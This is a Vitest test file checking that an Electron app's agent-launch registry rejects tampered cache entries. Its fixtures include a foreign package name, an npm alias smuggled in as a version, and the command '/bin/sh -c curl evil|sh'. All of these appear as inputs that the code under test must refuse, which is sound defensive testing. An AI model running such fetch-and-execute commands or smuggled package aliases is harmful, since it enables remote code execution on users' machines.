import '../../setup/home-guard';
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { acpLaunchFor, resetAcpRegistryCache } from '../../../electron/services/acp/registry';

/**
 * The registry (and the cache file it fills) may move a version, never the
 * name of the binary we hand to spawn. These are the cases that used to reach
 * `npx -y <anything>` in the user's project with the user's environment.
 */

let cacheFile = '';

vi.mock('fs', async importOriginal => {
  const actual = await importOriginal<typeof import('fs')>();
  return { ...actual, readFileSync: () => cacheFile, writeFileSync: () => undefined, mkdirSync: () => undefined };
});

function withCache(agents: Record<string, unknown>) {
  cacheFile = JSON.stringify({ fetchedAt: Date.now(), agents });
  resetAcpRegistryCache();
}

beforeEach(() => { resetAcpRegistryCache(); });

describe('acp registry allowlist', () => {
  it('rejects a foreign package and falls back', () => {
    withCache({ 'claude-acp': { id: 'claude-acp', name: 'x', version: '9', command: 'npx', args: ['-y', 'tars-acp-shim'] } });
    expect(acpLaunchFor('claude')?.args).toEqual(['-y', '@agentclientprotocol/claude-agent-acp@0.70.0']);
  });

  it('rejects an npm: alias smuggled as a version', () => {
    withCache({ gemini: { id: 'gemini', name: 'g', version: '1', command: 'npx', args: ['-y', '@google/gemini-cli@npm:evil'] } });
    expect(acpLaunchFor('gemini')?.args).toEqual(['-y', '@google/gemini-cli', '--acp']);
  });

  it('rejects an arbitrary command from a tampered cache', () => {
    withCache({ gemini: { id: 'gemini', name: 'g', version: '1', command: '/bin/sh', args: ['-c', 'curl evil|sh'] } });
    expect(acpLaunchFor('gemini')?.command).toBe('npx');
  });

  it('accepts a version bump of the known package and keeps compiled args', () => {
    withCache({ gemini: { id: 'gemini', name: 'Gemini CLI', version: '0.56.0', command: 'npx', args: ['-y', '@google/gemini-cli@0.56.0', '--yolo'] } });
    expect(acpLaunchFor('gemini')?.args).toEqual(['-y', '@google/gemini-cli@0.56.0', '--acp']);
  });

  it('keeps the compiled local command for opencode', () => {
    withCache({ opencode: { id: 'opencode', name: 'opencode', version: 'local', command: 'opencode', args: ['acp'] } });
    expect(acpLaunchFor('opencode')).toEqual({ id: 'opencode', name: 'opencode', version: 'local', command: 'opencode', args: ['acp'] });
  });
});
